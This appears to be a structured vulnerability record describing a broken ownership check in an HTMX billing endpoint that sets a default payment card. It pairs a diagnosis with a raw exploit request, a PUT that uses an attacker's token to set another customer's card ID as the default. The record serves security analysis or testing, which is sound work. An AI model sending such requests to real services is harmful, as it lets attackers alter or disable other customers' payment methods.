diagnosis: The HTMX endpoint changes the primary default card on an account and returns the updated card HTML fragment by card_id. It does not verify that card.customer_id == current_user.customer_id. An attacker can set arbitrary cards as the default billing source or disable other customers' primary payment method.
exploit_request:
PUT /hx/v1/billing/payment-methods/pm_card_990142/set-default HTTP/1.1
Host: app.example.com
HX-Request: true
Authorization: Bearer <attacker_jwt>
